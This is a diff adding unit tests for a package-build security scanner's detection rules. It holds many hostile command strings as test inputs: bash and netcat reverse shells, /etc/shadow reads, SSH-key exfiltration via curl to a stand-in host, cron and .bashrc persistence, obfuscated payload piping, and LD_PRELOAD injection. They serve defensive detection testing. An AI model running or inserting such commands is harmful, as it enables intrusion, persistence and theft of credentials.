@@ -122,6 +122,121 @@ class RuleFiringTest(unittest.TestCase):
         self.assertIn('systemd_service_install', rules_for('systemctl daemon-reload'))
 
 
+class CompetitiveResearchRuleTest(unittest.TestCase):
+    """Rules added from the 2026-06-16 competitive-research plan (Theme 1). Each rule gets a
+    positive-firing case and a false-positive-safe case."""
+
+    # --- Reverse shells --- #
+    def test_reverse_shell_bash(self):
+        self.assertIn('reverse_shell_bash', rules_for('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))
+        self.assertIn('reverse_shell_bash', rules_for('exec 5<>/dev/tcp/evil.host/9001'))
+        # a TCP-related comment / unrelated /dev path does not fire
+        self.assertNotIn('reverse_shell_bash', rules_for('install -Dm644 foo /dev/null'))
+
+    def test_reverse_shell_lang(self):
+        self.assertIn('reverse_shell_lang', rules_for("python -c 's.connect((h,p))'  # socket.connect"))
+        self.assertIn('reverse_shell_lang', rules_for('perl -e "fsockopen()"'))
+        self.assertIn('reverse_shell_lang', rules_for('ruby -e "TCPSocket.open(h,p)"'))
+        self.assertNotIn('reverse_shell_lang', rules_for('make connect-test'))
+
+    def test_reverse_shell_listener(self):
+        self.assertIn('reverse_shell_listener', rules_for('nc -lvp 4444 -e /bin/sh'))
+        self.assertIn('reverse_shell_listener', rules_for('ncat -l 9001'))
+        self.assertIn('reverse_shell_listener', rules_for('socat TCP-LISTEN:4444 EXEC:/bin/bash'))
+        # downloading with nc (no -l) is network_cmd, not a listener
+        self.assertNotIn('reverse_shell_listener', rules_for('depends=("openbsd-netcat")'))
+
+    # --- Credential theft --- #
+    def test_credential_harvest(self):
+        self.assertIn('credential_harvest', rules_for('cp -r ~/.gnupg /tmp/loot'))
+        self.assertIn('credential_harvest', rules_for('cat /etc/shadow'))
+        self.assertIn('credential_harvest', rules_for('tar czf x ~/.mozilla/firefox'))
+        self.assertNotIn('credential_harvest', rules_for('install -d "$pkgdir/usr/share/keyrings"'))
+
+    def test_ssh_key_exfil(self):
+        self.assertIn('ssh_key_exfil', rules_for('curl -F f=@~/.ssh/id_rsa http://evil/u'))
+        self.assertIn('ssh_key_exfil', rules_for('cat ~/.ssh/id_ed25519 > /tmp/out'))
+        # reading a key without sending it is sensitive_path territory, not exfil
+        self.assertNotIn('ssh_key_exfil', rules_for('chmod 600 "$pkgdir/etc/ssh/id_rsa"'))
+
+    # --- Persistence --- #
+    def test_systemd_timer_create(self):
+        self.assertIn('systemd_timer_create',
+                      rules_for('install -Dm644 evil.timer "$pkgdir/usr/lib/systemd/system/evil.timer"'))
+        # a plain .service install does not fire the timer rule
+        self.assertNotIn('systemd_timer_create',
+                         rules_for('install -Dm644 foo.service "$pkgdir/usr/lib/systemd/system/foo.service"'))
+
+    def test_cron_persist(self):
+        self.assertIn('cron_persist', rules_for('echo "* * * * * sh" | crontab -'))
+        self.assertIn('cron_persist', rules_for('cp job "$pkgdir/etc/cron.d/job"'))
+        self.assertNotIn('cron_persist', rules_for("depends=('cronie')"))
+
+    def test_rc_local(self):
+        self.assertIn('rc_local', rules_for('echo /tmp/x >> /etc/rc.local'))
+        self.assertIn('rc_local', rules_for('systemctl enable rc-local.service'))
+        self.assertNotIn('rc_local', rules_for('cp README "$pkgdir/usr/share/doc/local.md"'))
+
+    def test_shell_function_inject(self):
+        self.assertIn('shell_function_inject', rules_for('echo "evil() { :; }" >> ~/.bashrc'))
+        self.assertIn('shell_function_inject', rules_for('cat payload >> "$HOME/.zshrc"'))
+        # reading/sourcing a shell config (no append) does not fire this rule
+        self.assertNotIn('shell_function_inject', rules_for('source ~/.bashrc'))
+
+    # --- Obfuscation --- #
+    def test_printf_assembly(self):
+        self.assertIn('printf_assembly', rules_for(r'eval $(printf "\x2f\x62\x69\x6e")'))
+        self.assertIn('printf_assembly', rules_for(r'printf "\57\142\151\156"'))
+        # a normal printf of text does not fire
+        self.assertNotIn('printf_assembly', rules_for('printf "Building %s\\n" "$pkgname"'))
+
+    def test_gzip_payload(self):
+        self.assertIn('gzip_payload', rules_for('zcat payload.gz | bash'))
+        self.assertIn('gzip_payload', rules_for('gunzip -c x.gz | sh'))
+        # extracting a tarball normally does not fire
+        self.assertNotIn('gzip_payload', rules_for('tar xzf "$pkgname-$pkgver.tar.gz"'))
+
+    def test_xxd_decode(self):
+        self.assertIn('xxd_decode', rules_for('xxd -r -p hex.txt | sh'))
+        self.assertNotIn('xxd_decode', rules_for('xxd firmware.bin > dump.txt'))
+
+    # --- Dependency confusion --- #
+    def test_dep_confusion(self):
+        self.assertIn('dep_confusion', rules_for("provides=('bash' 'coreutils')"))
+        self.assertIn('dep_confusion', rules_for("conflicts=('systemd')"))
+        # depending on a core package is normal; providing your own name is fine
+        self.assertNotIn('dep_confusion', rules_for("depends=('glibc' 'systemd')"))
+        self.assertNotIn('dep_confusion', rules_for("provides=('libfoo.so')"))
+
+    # --- Weak integrity --- #
+    def test_weak_checksum(self):
+        self.assertIn('weak_checksum', rules_for("md5sums=('d41d8cd98f00b204e9800998ecf8427e')"))
+        self.assertIn('weak_checksum', rules_for("sha1sums=('da39a3ee5e6b4b0d3255bfef95601890afd80709')"))
+        # the strong checksums in CLEAN_PKGBUILD do not fire
+        self.assertNotIn('weak_checksum', rules_for("sha256sums=('abc')"))
+        self.assertNotIn('weak_checksum', rules_for("b2sums=('abc')"))
+
+    # --- http source --- #
+    def test_http_source(self):
+        self.assertIn('http_source', rules_for('source=("http://example.com/foo.tar.gz")'))
+        # https is fine; git+http is verified by commit hash; localhost is harmless
+        self.assertNotIn('http_source', rules_for('source=("https://example.com/foo.tar.gz")'))
+        self.assertNotIn('http_source', rules_for('source=("git+http://example.com/foo.git#commit=abc")'))
+        self.assertNotIn('http_source', rules_for('curl http://localhost:8080/health'))
+
+    # --- Privilege escalation --- #
+    def test_suid_capability(self):
+        self.assertIn('suid_capability', rules_for('setcap cap_setuid+ep "$pkgdir/usr/bin/foo"'))
+        self.assertIn('suid_capability', rules_for('setcap cap_net_raw=ep /usr/bin/ping'))
+        # a benign capability (cap_net_bind_service) does not fire
+        self.assertNotIn('suid_capability', rules_for('setcap cap_net_bind_service=+ep /usr/bin/foo'))
+
+    def test_ld_preload(self):
+        self.assertIn('ld_preload', rules_for('LD_PRELOAD=/tmp/evil.so /usr/bin/foo'))
+        self.assertIn('ld_preload', rules_for('echo /tmp/evil.so > /etc/ld.so.preload'))
+        self.assertNotIn('ld_preload', rules_for('export LD_LIBRARY_PATH=/usr/lib'))
+
+
 class ScanMechanicsTest(unittest.TestCase):
     def test_comment_lines_are_skipped(self):
         self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))
